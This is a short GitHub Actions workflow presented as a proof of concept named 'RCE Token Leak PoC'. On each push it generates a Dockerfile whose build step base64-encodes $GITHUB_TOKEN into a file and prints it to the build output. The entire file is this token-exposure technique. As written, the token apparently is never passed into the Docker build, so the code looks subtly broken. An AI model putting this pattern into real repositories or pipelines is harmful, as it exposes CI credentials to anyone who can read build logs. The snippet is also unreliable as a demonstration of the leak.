name: RCE Token Leak PoC
on: [push]

jobs:
  rce:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Build injected Dockerfile
        run: |
          echo -e "FROM alpine\nRUN echo \$GITHUB_TOKEN | base64 > /leaked && cat /leaked" > Dockerfile
          docker build -t poc .
